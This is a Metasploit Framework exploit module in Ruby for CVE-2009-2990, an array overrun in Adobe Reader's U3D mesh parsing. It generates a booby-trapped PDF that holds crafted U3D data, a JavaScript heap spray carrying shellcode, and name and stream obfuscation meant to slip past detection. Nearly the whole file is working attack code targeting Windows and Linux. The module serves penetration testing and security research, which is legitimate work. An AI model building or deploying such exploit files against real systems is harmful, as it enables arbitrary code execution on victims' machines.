##
# $Id: adobe_u3d_meshcont.rb 10394 2010-09-20 08:06:27Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'zlib'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Adobe U3D CLODProgressiveMeshDeclaration Array Overrun',
			'Description'    => %q{
					This module exploits an array overflow in Adobe Reader and Adobe Acrobat.
				Affected versions include < 7.1.4, < 8.1.7, and < 9.2. By creating a
				specially crafted pdf that a contains malformed U3D data, an attacker may
				be able to execute arbitrary code.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Felipe Andres Manzano <felipe.andres.manzano[at]gmail.com>',
					'jduck'
				],
			'Version'        => '$Revision: 10394 $',
			'References'     =>
				[
					[ 'CVE', '2009-2990' ],
					[ 'OSVDB', '58920' ],
					[ 'BID', '36665' ],
					[ 'URL', 'http://sites.google.com/site/felipeandresmanzano/' ],
					[ 'URL', 'http://www.adobe.com/support/security/bulletins/apsb09-15.html' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'      => "\x00",
					'DisableNops'	 => true
				},
			'Targets'        =>
				[
					# test results (on Windows XP SP3)
					# reader 7.0.5 - untested
					# reader 7.0.8 - untested
					# reader 7.0.9 - untested
					# reader 7.1.0 - untested
					# reader 7.1.1 - untested
					# reader 8.0.0 - untested
					# reader 8.1.2 - works
					# reader 8.1.3 - works
					# reader 8.1.4 - untested
					# reader 8.1.5 - untested
					# reader 8.1.6 - untested
					# reader 9.0.0 - untested
					# reader 9.1.0 - works
					[ 'Adobe Reader Windows Universal (JS Heap Spray)',
						{
							'Index'		=> 0x01d10000,
							'Platform'	=> 'win',
							'Arch'		=> ARCH_X86,
							'escA'		=> 0x0f0f0f0f,
							'escB'		=> 0x16161616,
							'escC'		=> 0x1c1c1c1c
						}
					],

					# untested
					[ 'Adobe Reader Linux Universal (JS Heap Spray)',
						{
							'Index'		=> 0xfffffe3c,
							'Platform'	=> 'linux',
							'Arch'		=> ARCH_X86,
							'escA'		=> 0x75797959,
							'escB'		=> 0xa2a2a2a2,
							'escC'		=> 0x9c9c9c9c
						}
					]
				],
			'DisclosureDate' => 'Oct 13 2009',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME', [ true, 'The file name.',  'msf.pdf']),
			], self.class)

	end



	def exploit
		# Encode the shellcode.
		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))

		# Make some nops
		nops    = Rex::Text.to_unescape(make_nops(4))

		# prepare the pointers!
		ptrA = Rex::Text.to_unescape([target['escA']].pack('V'), Rex::Arch.endian(target.arch))
		ptrB = Rex::Text.to_unescape([target['escB']].pack('V'), Rex::Arch.endian(target.arch))
		ptrC = Rex::Text.to_unescape([target['escC']].pack('V'), Rex::Arch.endian(target.arch))

		script = <<-EOF
var nopz = unescape("#{nops}");
function mkSlice(stringy,size,rest){
	while (stringy.length <= size/2)
		stringy += stringy;
	stringy = stringy.substring(0, size/2 -32/2 -4/2 - rest -2/2);
	return stringy;
};

function spray(escA,escB,escC,escShellcode){
	var loop1;
	var pointersA = unescape(escA);
	var pointersB = unescape(escB);
	var pointersC = unescape(escC);
	var shellcode = unescape(escShellcode);

	pointersA_slide=mkSlice(pointersA,0x100000, pointersA.length);
	pointersB_slide=mkSlice(pointersB,0x100000, pointersB.length);
	pointersC_slide=mkSlice(pointersC,0x100000, pointersC.length);
	nop_slide = mkSlice(nopz,0x100000, shellcode.length);
	var xarr = new Array();
	for (loop1 = 0; loop1 < 400; loop1++) {
		if(loop1<100)
			xarr[loop1] = pointersA_slide+pointersA;
		else if(loop1<200)
			xarr[loop1] = pointersB_slide+pointersB;
		else if(loop1<300)
			xarr[loop1] = pointersC_slide+pointersC;
		else
			xarr[loop1] = nop_slide+shellcode;
		}
		return xarr;
	};
	var memoryz = spray("#{ptrA}","#{ptrB}","#{ptrC}","#{shellcode}");
	this.pageNum = 1;
EOF

		# Obfuscate it up a bit
		script = obfuscate_js(script,
			'Symbols' => {
				'Variables' => %W{ pointersA_slide pointersA escA pointersB_slide pointersB escB pointersC_slide pointersC escC escShellcode nop_slide shellcode stringy size rest nopz loop1 xarr memoryz },
				'Methods' => %W{ mkSlice spray }
			}).to_s

		# create the u3d stuff
		u3d = make_u3d_stream(target['Index'], "E" * 11)

		# Create the pdf
		pdf = make_pdf(script, u3d)

		print_status("Creating '#{datastore['FILENAME']}' file...")

		file_create(pdf)
	end


	def obfuscate_js(javascript, opts)
		js = Rex::Exploitation::ObfuscateJS.new(javascript, opts)
		js.obfuscate
		return js
	end


	def RandomNonASCIIString(count)
		result = ""
		count.times do
			result << (rand(128) + 128).chr
		end
		result
	end

	def ioDef(id)
		"%d 0 obj\n" % id
	end

	def ioRef(id)
		"%d 0 R" % id
	end

	#http://blog.didierstevens.com/2008/04/29/pdf-let-me-count-the-ways/
	def nObfu(str)

		result = ""
		str.scan(/./u) do |c|
			if rand(2) == 0 and c.upcase >= 'A' and c.upcase <= 'Z'
				result << "#%x" % c.unpack("C*")[0]
			else
				result << c
			end
		end
		result
	end

	def ASCIIHexWhitespaceEncode(str)
		result = ""
		whitespace = ""
		str.each_byte do |b|
			result << whitespace << "%02x" % b
			whitespace = " " * (rand(3) + 1)
		end
		result << ">"
	end


	def u3d_pad(str, char="\x00")
		ret = ""
		if (str.length % 4) > 0
			ret << char * (4 - (str.length % 4))
		end
		return ret
	end


	def make_u3d_stream(index, meshname)

		# build the U3D header (length will be patched in later)
		hdr_data = [1,0].pack('n*') # version info
		hdr_data << [0,0x24,31337,0,0x6a].pack('VVVVV')
		hdr = "U3D\x00"
		hdr << [hdr_data.length,0].pack('VV')
		hdr << hdr_data

		# mesh declaration
		decl_data = [meshname.length].pack('v')
		decl_data << meshname
		decl_data << [0].pack('V') # chain idx
		# max mesh desc
		decl_data << [0].pack('V') # mesh attrs
		decl_data << [0xc322].pack('V') # face count
		decl_data << [0x6226].pack('V') # position count
		decl_data << [0x24966].pack('V') # normal count
		decl_data << [0].pack('V') # diffuse color count
		decl_data << [0].pack('V') # specular color count
		decl_data << [0].pack('V') # texture coord count
		decl_data << [1].pack('V') # shading count
		# shading desc
		decl_data << [0].pack('V') # shading attr
		decl_data << [1].pack('V') # texture layer count
		decl_data << [0].pack('V') # texture coord dimensions
		decl_data << [0].pack('V') # original shading id
		# minimum resolution
		decl_data << [0x6226].pack('V') # final maximum resolution (needs to be bigger than the minimum)
		# quality factors
		decl_data << [0x12c].pack('V') # position quality factor
		decl_data << [0x12c].pack('V') # normal quality factor
		decl_data << [0x12c].pack('V') # texture coord quality factor
		# inverse quantiziation
		decl_data << [0x3f0b1e6c].pack('V') # position inverse quant
		decl_data << [0x3b6f05a6].pack('V') # normal inverse quant
		decl_data << [0x3b6f05a6].pack('V') # texture coord inverse quant
		decl_data << [0x3c2df54a].pack('V') # diffuse color inverse quant
		decl_data << [0x3c2df54a].pack('V') # specular color inverse quant
		# resource params
		decl_data << [0x3f666666].pack('V') # normal crease param
		decl_data << [0x3f000000].pack('V') # normal update param
		decl_data << [0x3f7c28f6].pack('V') # normal tolerance param
		# skeleton description
		decl_data << [0].pack('V') # bone count
		# padding
		mesh_decl = [0xffffff31,decl_data.length,0].pack('VVV')
		mesh_decl << decl_data
		mesh_decl << u3d_pad(decl_data)

		# build the modifier chain
		chain_data = [meshname.length].pack('v')
		chain_data << meshname
		chain_data << [1].pack('V') # type (model resource)
		chain_data << [0].pack('V') # attributes (no bounding info)
		chain_data << u3d_pad(chain_data)
		chain_data << [1].pack('V') # number of modifiers
		chain_data << mesh_decl
		modifier_chain = [0xffffff14,chain_data.length,0].pack('VVV')
		modifier_chain << chain_data

		# mesh continuation
		cont_data = [meshname.length].pack('v')
		cont_data << meshname
		cont_data << [0].pack('V') # chain idx
		cont_data << [0].pack('V') # start resolution
		cont_data << [0x1000].pack('V') # end resolution
		# 4096 continuation blocks
		cont_data << [index].pack('V') # split position index
		cont_data << [0].pack('v') # new diffuse color count
		cont_data << [0].pack('v') # new specular color count
		cont_data << [0].pack('v') # new text coord count
		cont_data << [0].pack('V') # new face count
		# unknown data
		cont_data << "\x07\x9c\x00\x00\x00\x37\x0c\x00\x00\xd0\x02\x00\x00\x3f\xeb\x95\x0d\x00\x00\x76"
		cont_data << "\x05\x00\x00\xea\x15\x00\x00\xe2\x02\x00\x00\x00\x00\x00\x00\x80\x82\x22\x8e\x2f"
		cont_data << "\xaa\x00\x00\x00\xc2\x13\x23\x00\x20\xbb\x06\x00\x80\xc2\x1f\x00\x80\x20\x00\x00"
		cont_data << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xc0\x14\x01\x00\x20\x44"
		cont_data << "\x0a\x00\x10\x7e\x4b\x8d\xf8\x7c\x32\x6d\x03\x00\x00\xb2\x0b\x00\x20\xfd\x19\x00"
		cont_data << "\x20\xb6\xe9\xea\x2e\x55\x00\x00\x59\x94\x00\x00\x4c\x00\x01\x00\x1a\xbb\xa0\xc8"
		cont_data << "\xc1\x04\x00\x70\xc4\xa0\x00\x00\x00\x6c\x98\x46\xac\x04\x00\x60\xf6\x1c\x00\x20"
		cont_data << "\xa1\x0f\x00\xa0\x17\x66\x23\x00\x00\xde\x88\x1d\x00\x00\x7b\x16\x9f\x72\x9a\x1d"
		cont_data << "\x15\x00\x80\xeb\x39\x00\x00\x00\x00\x00\x00\x94\xc8\x00\x00\x54\xce\xfb\x32\x00"
		cont_data << "\x80\xc4\x3e\xb0\xc4\x88\xde\x77\x00\x00\x46\x72\x01\x00\xf0\x56\x01\x00\x8c\x53"
		cont_data << "\xe9\x10\x9d\x6b\x06\x00"
		cont_data << "\x50" # pad
		mesh_cont = [0xffffff3c,cont_data.length,0].pack('VVV')
		mesh_cont << cont_data
		#mesh_cont << u3d_pad(cont_data)
		mesh_cont << "\xa2\x00" # manual padding

		data = hdr
		data << modifier_chain
		data << mesh_cont

		# patch the length
		data[24,4] = [0x2b680].pack('V') # hardcode the data length

		if index == 0x01d10000
			#laziest hack ever! Another index must be found for using the following
			# stream in windows.. and a lot of tests shoul be done.
			return data
		end


		# linux version
		# build the U3D header (length will be patched in later)
		hdr_data = [1,0].pack('n*') # version info
		hdr_data << [0,0x24,31337,0,0x6a].pack('VVVVV')
		meta_str1 = "alalala0"
		meta_str2 = "\xa8" * 1024
		hdr_meta = [1].pack('V')
		hdr_meta << [meta_str1.length].pack('v')
		hdr_meta << meta_str1
		hdr_meta << [1].pack('V')
		hdr_meta << [meta_str2.length].pack('V')
		hdr_meta << meta_str2
		hdr = "U3D\x00"
		hdr << [hdr_data.length,hdr_meta.length].pack('VV')
		hdr << hdr_data
		hdr << hdr_meta
		hdr << u3d_pad(hdr_meta)

		# mesh declaration
		decl_data = [meshname.length].pack('v')
		decl_data << meshname
		decl_data << [0].pack('V') # chain idx
		# max mesh desc
		decl_data << [0].pack('V') # mesh attrs
		decl_data << [0xc322].pack('V') # face count
		decl_data << [0x6626].pack('V') # position count
		decl_data << [4].pack('V') # normal count
		decl_data << [0].pack('V') # diffuse color count
		decl_data << [0].pack('V') # specular color count
		decl_data << [0].pack('V') # texture coord count
		decl_data << [1].pack('V') # shading count
		# shading desc
		decl_data << [0].pack('V') # shading attr
		decl_data << [0].pack('V') # texture layer count
		decl_data << [0].pack('V') # original shading id
		# no texture coord dimensions
		decl_data << [0x64].pack('V') # minimum resolution
		decl_data << [0x65].pack('V') # final maximum resolution (needs to be bigger than the minimum)
		# quality factors
		decl_data << [0x12c].pack('V') # position quality factor
		decl_data << [0x12c].pack('V') # normal quality factor
		decl_data << [0x12c].pack('V') # texture coord quality factor
		# inverse quantiziation
		decl_data << [0].pack('V') # position inverse quant
		decl_data << [0].pack('V') # normal inverse quant
		decl_data << [0].pack('V') # texture coord inverse quant
		decl_data << [0].pack('V') # diffuse color inverse quant
		decl_data << [0].pack('V') # specular color inverse quant
		# resource params
		decl_data << [0].pack('V') # normal crease param
		decl_data << [0].pack('V') # normal update param
		decl_data << [0].pack('V') # normal tolerance param
		# skeleton description
		decl_data << [0].pack('V') # bone count
		# padding
		mesh_decl = [0xffffff31,decl_data.length,0].pack('VVV')
		mesh_decl << decl_data
		mesh_decl << u3d_pad(decl_data)

		# build the modifier chain
		chain_data = [meshname.length].pack('v')
		chain_data << meshname
		chain_data << [1].pack('V') # type (model resource)
		chain_data << [0].pack('V') # attributes (no bounding info)
		chain_data << u3d_pad(chain_data)
		chain_data << [1].pack('V') # number of modifiers
		chain_data << mesh_decl
		modifier_chain = [0xffffff14,chain_data.length,0].pack('VVV')
		modifier_chain << chain_data

		# mesh continuation
		cont_data = [meshname.length].pack('v')
		cont_data << meshname
		cont_data << [0].pack('V') # chain idx
		cont_data << [0].pack('V') # start resolution
		cont_data << [0x100].pack('V') # end resolution
		# 256 continuation blocks
		cont_data << [index].pack('V') # split position index
		# unknown data
		cont_data << [1].pack('V') * 10
		cont_data << "Feli" * 20
		mesh_cont = [0xffffff3c,cont_data.length,0].pack('VVV')
		mesh_cont << cont_data
		mesh_cont << u3d_pad(cont_data)

		data = hdr
		data << modifier_chain
		data << mesh_cont

		# patch the length
		data[24,4] = [0x174].pack('V') # hardcode the data length
		return data

	end

	def make_pdf(js, u3d_stream)

		xref = []
		eol = "\x0a"
		obj_end = "" << eol << "endobj" << eol

		# the header
		pdf = "%PDF-1.7" << eol

		# filename/comment
		pdf << "%" << RandomNonASCIIString(4) << eol

		# js stream
		xref << pdf.length
		compressed = Zlib::Deflate.deflate(ASCIIHexWhitespaceEncode(js))
		pdf << ioDef(1) << nObfu("<</Length %s/Filter[/FlateDecode/ASCIIHexDecode]>>" % compressed.length) << eol
		pdf << "stream" << eol
		pdf << compressed << eol
		pdf << "endstream" << eol
		pdf << obj_end

		# catalog
		xref << pdf.length
		pdf << ioDef(3) << nObfu("<</Type/Catalog/Outlines ") << ioRef(4)
		pdf << nObfu("/Pages ") << ioRef(5)
		pdf << nObfu("/OpenAction ") << ioRef(8)
		pdf << nObfu(">>")
		pdf << obj_end

		# outline
		xref << pdf.length
		pdf << ioDef(4) << nObfu("<</Type/Outlines/Count 0>>")
		pdf << obj_end

		# kids
		xref << pdf.length
		pdf << ioDef(5) << nObfu("<</Type/Pages/Count 2/Kids [")
		pdf << ioRef(9) << " " # empty page
		pdf << ioRef(10) # u3d page
		pdf << nObfu("]>>")
		pdf << obj_end

		# u3d stream
		xref << pdf.length
		pdf << ioDef(6) << nObfu("<</Type/3D/Subtype/U3D/Length %s>>" % u3d_stream.length) << eol
		pdf << "stream" << eol
		pdf << u3d_stream << eol
		pdf << "endstream"
		pdf << obj_end

		# u3d annotation object
		xref << pdf.length
		pdf << ioDef(7) << nObfu("<</Type/Annot/Subtype")
		pdf << "/3D/3DA <</A/PO/DIS/I>>"
		pdf << nObfu("/Rect [0 0 640 480]/3DD ") << ioRef(6) << nObfu("/F 7>>")
		pdf << obj_end

		# js dict
		xref << pdf.length
		pdf << ioDef(8) << nObfu("<</Type/Action/S/JavaScript/JS ") + ioRef(1) + ">>" << obj_end

		# page 0 (empty)
		xref << pdf.length
		pdf << ioDef(9) << nObfu("<</Type/Page/Parent ") << ioRef(5) << nObfu("/MediaBox [0 0 640 480]")
		pdf << nObfu(" >>")
		pdf << obj_end

		# page 1 (u3d)
		xref << pdf.length
		pdf << ioDef(10) << nObfu("<</Type/Page/Parent ") << ioRef(5) << nObfu("/MediaBox [0 0 640 480]")
		pdf << nObfu("/Annots [") << ioRef(7) << nObfu("]")
		pdf << nObfu(">>")
		pdf << obj_end

		# xrefs
		xrefPosition = pdf.length
		pdf << "xref" << eol
		pdf << "0 %d" % (xref.length + 1) << eol
		pdf << "0000000000 65535 f" << eol
		xref.each do |index|
			pdf << "%010d 00000 n" % index << eol
		end

		# trailer
		pdf << "trailer" << eol
		pdf << nObfu("<</Size %d/Root " % (xref.length + 1)) << ioRef(3) << ">>" << eol
		pdf << "startxref" << eol
		pdf << xrefPosition.to_s() << eol
		pdf << "%%EOF" << eol

	end

end
